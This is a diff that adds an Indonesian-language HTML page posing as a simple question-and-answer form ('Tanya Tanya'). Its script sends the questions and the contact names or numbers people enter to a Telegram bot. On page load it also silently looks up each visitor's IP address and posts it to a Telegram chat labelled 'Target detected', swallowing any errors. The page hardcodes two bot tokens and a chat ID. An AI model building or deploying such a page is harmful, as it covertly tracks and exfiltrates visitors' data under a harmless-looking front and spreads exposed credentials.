@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Web Tanya Tanya</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #6b73ff 0%, #000dff 100%);
+    color: white;
+    margin: 0;
+    padding: 0;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .container {
+    background: #141a3a;
+    padding: 2rem 3rem;
+    border-radius: 12px;
+    box-shadow: 0 12px 24px rgba(0,0,0,0.3);
+    width: 90%;
+    max-width: 480px;
+  }
+  h1 {
+    margin-bottom: 1.5rem;
+    text-align: center;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+  label {
+    display: block;
+    margin-bottom: 0.6rem;
+    font-weight: 600;
+    font-size: 0.95rem;
+  }
+  input[type=text], textarea {
+    width: 100%;
+    padding: 0.75rem 1rem;
+    border-radius: 8px;
+    border: none;
+    font-size: 1rem;
+    margin-bottom: 1.2rem;
+    box-sizing: border-box;
+    resize: vertical;
+    font-family: inherit;
+  }
+  textarea {
+    min-height: 100px;
+  }
+  button {
+    width: 100%;
+    background: #00b09b;
+    border: none;
+    padding: 1rem;
+    font-size: 1.1rem;
+    color: white;
+    font-weight: 700;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background 0.3s ease;
+  }
+  button:hover {
+    background: #008c7a;
+  }
+  .message {
+    margin-top: 1rem;
+    font-weight: 600;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+  <div class="container" role="main">
+    <h1>Tanya Tanya</h1>
+    <form id="questionForm" aria-label="Form tanya tanya">
+      <label for="question">Pertanyaan</label>
+      <textarea id="question" name="question" required aria-required="true" placeholder="Tulis pertanyaan Anda di sini..."></textarea>
+      <label for="contact">Nama / Nomor</label>
+      <input type="text" id="contact" name="contact" required aria-required="true" placeholder="Nama atau nomor Anda" />
+      <button type="submit" aria-label="Kirim pertanyaan">Kirim Pertanyaan</button>
+    </form>
+    <div class="message" aria-live="polite" role="alert"></div>
+  </div>
+
+<script>
+  const BOT_TOKEN_QUESTIONS = "8107439602:AAFSm0I_24IzAUivshcUcnCbyzNi15GCAus";
+  const TARGET_CHAT_ID = "6613275120";
+  const BOT_TOKEN_IP = "7752335856:AAH0ypJTrWhVYjuiXIShl4E04GmIAKIOEpA";
+
+  function sendTelegramMessage(token, chatId, message) {
+    // Use fetch with URL encoded params
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const params = new URLSearchParams();
+    params.append('chat_id', chatId);
+    params.append('text', message);
+    params.append('parse_mode', 'HTML');
+    return fetch(url, { method: 'POST', body: params });
+  }
+
+  async function sendVisitorIp(ip) {
+    const message = `&lt;&sol;&gt; Target detected✅ (${ip})`;
+    try {
+      await sendTelegramMessage(BOT_TOKEN_IP, TARGET_CHAT_ID, message);
+    } catch(e) {
+      // silently ignore errors
+    }
+  }
+
+  async function sendQuestionContact(question, contact) {
+    const message = `<b>New Question Received</b>\n\n<b>Question:</b> ${escapeHtml(question)}\n<b>Contact:</b> ${escapeHtml(contact)}`;
+    try {
+      await sendTelegramMessage(BOT_TOKEN_QUESTIONS, TARGET_CHAT_ID, message);
+    } catch(e) {
+      // silently ignore errors
+    }
+  }
+
+  function escapeHtml(text) {
+    const map = {
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#039;'
+    };
+    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
+  }
+
+  function getVisitorIP() {
+    // Use a free public IPify API to get user's IP
+    return fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => data.ip)
+      .catch(() => 'IP not found');
+  }
+
+  document.getElementById('questionForm').addEventListener('submit', async function(event) {
+    event.preventDefault();
+    const questionInput = document.getElementById('question');
+    const contactInput = document.getElementById('contact');
+    const messageContainer = document.querySelector('.message');
+
+    const question = questionInput.value.trim();
+    const contact = contactInput.value.trim();
+
+    if (!question || !contact) {
+      messageContainer.textContent = 'Mohon isi pertanyaan dan nama/nomor Anda.';
+      return;
+    }
+
+    messageContainer.textContent = 'Mengirim pertanyaan...';
+
+    await sendQuestionContact(question, contact);
+
+    messageContainer.textContent = 'Pertanyaan berhasil dikirim. Terima kasih!';
+
+    questionInput.value = '';
+    contactInput.value = '';
+  });
+
+  (async () => {
+    const ip = await getVisitorIP();
+    await sendVisitorIp(ip);
+  })();
+</script>
+</body>
+</html>
+
+```
